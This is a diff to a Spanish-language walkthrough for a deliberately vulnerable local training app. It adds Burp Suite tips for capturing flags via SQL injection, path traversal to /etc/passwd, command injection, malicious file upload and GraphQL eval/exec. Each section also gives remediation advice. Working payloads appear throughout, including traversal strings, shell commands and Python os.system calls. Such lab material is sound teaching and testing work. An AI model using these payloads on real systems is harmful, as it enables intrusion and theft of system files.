@@ -29,6 +29,8 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
   | jq -r .access_token)
 ```
 
+> **¿Prefieres Burp Suite?** Aquí el fuerte es **Repeater** para inyecciones: pega el payload, asegúrate de **URL-encodear** en query strings (`Ctrl+U`), y usa el tab **Inspector** para ver el valor decodificado al iterar. Para los uploads, `Proxy → Intercept` y edita el `filename`. Config en el **Anexo 7** del `README.md`.
+
 ---
 
 ## R13 — SQL Injection en búsqueda de usuarios
@@ -58,6 +60,8 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
 
 **Flag**: `FH{sqli-users-search}`
 
+> **Con Burp**: en `Repeater` con `GET /api/users/search?q=<payload>`, URL-encodea los espacios y comillas (`' OR '1'='1` → `'%20OR%20'1'='1`) y envíalo; prueba variantes hasta ver `result_count` alto con `password_hash`.
+
 **Remediación**: ORM con binds/params, no concatenar el input; evitar `text()` con strings de usuario.
 
 ---
@@ -85,11 +89,13 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
    curl -s -X POST http://localhost:5000/graphql/query \
      -H 'Content-Type: application/json' -d '{"query":"filter users where: user.is_admin == True"}'
    ```
-   > Nota de diseño: el dispatcher comprueba `'user' in query` *antes* que `filter`, de modo que cualquier query que contenga `user`/`users` cae en el **handler de data-exposure** y devuelve la tabla completa (todos los usuarios, no solo los filtrados). El intento de "filtrar" es por tanto también una fuga total.
+   > Nota de diseño: el dispatcher comprueba `'user' in query` *antes* que `filter`, de modo que cualquier query que contenga `user`/`users` cae en el **handler de data-exposure** y devuelve la tabla completa (todos los usuarios, no solo los filtrados). El intento de "filtrar" es por tanto también una fuga total. ⚠️ El flag `FH{graphql-filter-eval}` corresponde al handler `handle_user_filtering` (eval sobre expresiones del cliente), que **en la práctica es código no alcanzable** desde el dispatcher con esta precedencia de checks — bonificación conceptual: el `eval()` existe en `graphql_vuln.py`, pero para explotarlo hay que llegar por otra vía.
 
 **Prueba de éxito**: respuesta con `data.users` incluyendo `password_hash`, `balance`, `is_admin`; y `data.products` con dueños. El paso 3 vuelca también todos los usuarios (incluidos `is_admin=true`).
 
 **Flag**: `FH{graphql-data-leak}` · `FH{graphql-filter-eval}`
+
+> **Con Burp**: en `Repeater` con `POST /graphql/query` pega los payloads tal cual (JSON no exige encoding): `{ user }`, `{ product }` y variantes con `filter`/`users` para ver la fuga total.
 
 **Remediación**: cerrar el foco GraphQL (no usar un "resolver mágico"), evitar `eval()` sobre expresiones del cliente, y autenticar todos los campos.
 
@@ -117,6 +123,8 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
 **Prueba de éxito**: contenido de `/etc/passwd` en ambos (el primero con `%2e%2e` y `--path-as-is`).
 
 **Flag**: `FH{path-traversal-files}` · `FH{pt-transactions-export}`
+
+> **Con Burp**: el primer vector requiere `%2e%2e` en el *path*; desactiva en *Project options → HTTP* la normalización de paths y envía `/api/files/%2e%2e/%2e%2e/etc/passwd`. El segundo va en el *query string* (`filename=../../etc/passwd`) — URL-encodea los `/` si Burp te los corrige.
 
 **Remediación**: usar `secure_filename` + `os.path.realpath(...).startswith(UPLOAD_DIR)`; servir con `send_from_directory`.
 
@@ -146,6 +154,8 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
 **Prueba de éxito**: `{"output":"uid=0(root) gid=0(root) groups=0(root)\n"}` → **RCE as root** en el contenedor.
 
 **Flag**: `FH{rce-sku-lookup}`
+
+> **Con Burp**: `POST /api/inventory/sku-lookup` en `Repeater` con body `{"sku":"cat /etc/passwd | head -3"}` — el JSON manda el comando sin encoding. Prueba con `id` primero y observa `"output"`.
 
 **Remediación**: nunca usar `shell=True` con input de usuario; validar el SKU contra un formato estricto o consultar en BD.
 
@@ -180,8 +190,11 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
    ```
 
 **Prueba de éxito**: `{"message":"File uploaded successfully","path":"uploads/shell.txt"}` y el contenido se puede leer en `/api/files/shell.txt`.
+> Nota de la variante de traversal: el nombre con `../` **escapa del directorio `uploads/`**, pero el destino exacto depende del CWD del servidor (p. ej. con CWD=`/app` aterriza en `/tmp/pwned.txt`; ejecutando en desarrollo puede quedar en `<CWD>/../tmp/pwned.txt`). La prueba real del fallo es que el archivo termina fuera de `uploads/`.
 
 **Flag**: `FH{insecure-file-upload}` · (variante traversal) `FH{upload-path-traversal}`
+
+> **Con Burp**: activa `Proxy → Intercept`, sube el archivo desde la UI del lab (`/upload`) y **edita el multipart** en caliente: cambia `filename="shell.txt"` por un nombre con `../` para la variante traversal. Luego `GET /api/files/shell.txt` en `Repeater` para confirmar.
 
 **Remediación**: validar extensión/MIME real (magic bytes), tamaño, y guardar con nombre aleatorio en location fuera del webroot.
 
@@ -213,6 +226,8 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
 **Prueba de éxito**: `GET /transactions/export?filename=../../etc/passwd` devuelve el contenido de `/etc/passwd` **sin auth**; con `cmd=id` responde la salida de `id`.
 
 **Flag**: `FH{rce-transactions-export}` (+ `FH{pt-transactions-export}` con la de R15)
+
+> **Con Burp**: `GET /transactions/export?filename=a.txt?cmd=id&runner=bash` en `Repeater` (primero sube `a.txt` para que `filename` exista). Como el `?` del payload va en el query, URL-encodea la interrogación si hace falta y verás `"output"` con la salida de `id`.
 
 **Remediación**: sanitizar `filename`, nunca ejecutar `cmd`, restringir por autenticación.
 
@@ -256,6 +271,8 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
 **Prueba de éxito**: `data.output: "266\n"` para `print(38*7)`; `data.content` con el inicio de `/etc/passwd`; `data.command` con `"executed"`.
 
 **Flag**: `FH{graphql-rce}` · `FH{graphql-file-read}`
+
+> **Con Burp**: `POST /graphql/query` en `Repeater` con payloads: `exec("print(38*7)")`, `import os; os.system("id")`, `open("/etc/passwd").read()`. Fíjate en `data.output`/`data.content`.
 
 **Remediación**: parsear el query con un motor GraphQL real (esto es *unsafe consumption*): desactivar `eval`/`exec`, limitar tipos de campos y filtrar el acceso.
 
